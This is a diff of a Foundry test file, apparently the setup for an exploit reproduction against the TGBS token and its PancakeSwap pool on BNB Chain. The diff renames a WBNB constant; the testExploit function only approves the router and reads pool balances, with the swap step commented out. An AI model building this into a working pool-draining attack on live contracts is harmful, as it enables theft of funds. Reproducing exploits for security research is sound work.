@@ -8,7 +8,7 @@ import "@interface/IWBNB.sol";
 import "@interface/IPancakeV2.sol";
 import "@interface/IDodo.sol";
 
-WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
 IDODO constant dodoPool = IDODO(0x05d968B7101701b6AD5a69D45323746E9a791eB5);
 
 ITGBS constant TGBS = ITGBS(0xedecfA18CAE067b2489A2287784a543069f950F4);
@@ -27,11 +27,11 @@ contract TgbsTest is Test {
     function setUp() public {
         vm.createSelectFork("bsc", 36725819);
         vm.label(address(dodoPool), "dodoPool");
-        vm.label(address(BNB), "WBNB");
+        vm.label(address(WBNB), "WBNB");
         vm.label(address(TGBS), "TGBS");
         vm.label(address(PancakeV2Router), "PancakeV2Router");
 
-        deal(address(BNB), address(this), 1300 ether);
+        deal(address(WBNB), address(this), 1300 ether);
     }
 
     function print(string memory _txt, uint256 value, uint256 decimal) public {
@@ -39,7 +39,7 @@ contract TgbsTest is Test {
     }
 
     function testExploit() public {
-        BNB.approve(address(PancakeV2Router), type(uint256).max - 1);
+        WBNB.approve(address(PancakeV2Router), type(uint256).max - 1);
         TGBS.approve(address(PancakeV2Router), type(uint256).max - 1);
 
         // token2token(address(BNB), address(TGBS), 1300 ether);
@@ -50,7 +50,7 @@ contract TgbsTest is Test {
         // console.log(block.number);
 
         uint256 poolAmount = TGBS.balanceOf(address(WBNB_TGBS_Pool));
-        uint256 poolBNB = BNB.balanceOf(address(WBNB_TGBS_Pool));
+        uint256 poolBNB = WBNB.balanceOf(address(WBNB_TGBS_Pool));
         print("poolAmount", poolAmount, 18);
         print("poolBNB", poolBNB, 18);
     }
